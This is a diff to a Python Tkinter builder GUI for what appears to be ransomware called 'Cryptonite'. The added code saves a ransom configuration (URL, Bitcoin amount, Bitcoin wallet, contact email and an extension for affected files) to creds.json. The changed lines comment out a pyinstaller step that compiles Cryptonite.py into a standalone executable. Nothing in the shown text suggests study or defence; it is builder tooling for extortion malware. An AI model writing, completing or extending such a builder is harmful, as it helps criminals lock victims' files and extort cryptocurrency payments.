@@ -1,7 +1,7 @@
 import tkinter as tk
 from tkinter import ttk
 from tkinter.filedialog import askdirectory
-
+import json
 folder = None
 
 def selectfolder():
@@ -21,6 +21,15 @@ def selectfolder():
             restore_btn.grid(row = 8, column = 0, pady = 20, sticky = "s", columnspan = 2)
 
 def generate():
+    configDict = {
+        "URL": url_entry.get(),
+        "BTC_AMOUNT": btcm_entry.get(),
+        "BTC_WALLET": btcw_entry.get(),
+        "EMAIL": email_entry.get(),
+        "EXT": ext_entry.get().replace(".", "")
+    }
+    with open("creds.json", "w") as f:
+        json.dump(configDict, f)
     import os
     OS = os.name
     if not folder:
@@ -29,17 +38,17 @@ def generate():
     FILE = name_entry.get()
     if not FILE:
         return
-    generate_btn.state(["disabled"])
-    generate_btn.config(text = "Generating..")
-    os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
-    if OS == "nt":
-        os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
-    else:
-        os.system(f"mv /dist/{FILE}.exe ./")
-        os.system(f"rm -r __pycache__")
-        os.system(f"rm -r build")
-        os.system(f"rm -r dist")
-        os.system(f"{FILE}.spec")
+    # generate_btn.state(["disabled"])
+    # generate_btn.config(text = "Generating..")
+    # os.system(f"pyinstaller --onefile --clean --icon=\"icon.ico\" Cryptonite.py --name {FILE}")
+    # if OS == "nt":
+    #     os.system(f"MOVE /Y \"{PATH}\\dist\\{FILE}.exe\" \"{PATH}\" && rmdir /Q /S __pycache__ build dist && del /Q {FILE}.spec")
+    # else:
+    #     os.system(f"mv /dist/{FILE}.exe ./")
+    #     os.system(f"rm -r __pycache__")
+    #     os.system(f"rm -r build")
+    #     os.system(f"rm -r dist")
+    #     os.system(f"{FILE}.spec")
     generate_btn.config(text = "Done!")
 
 window = tk.Tk()
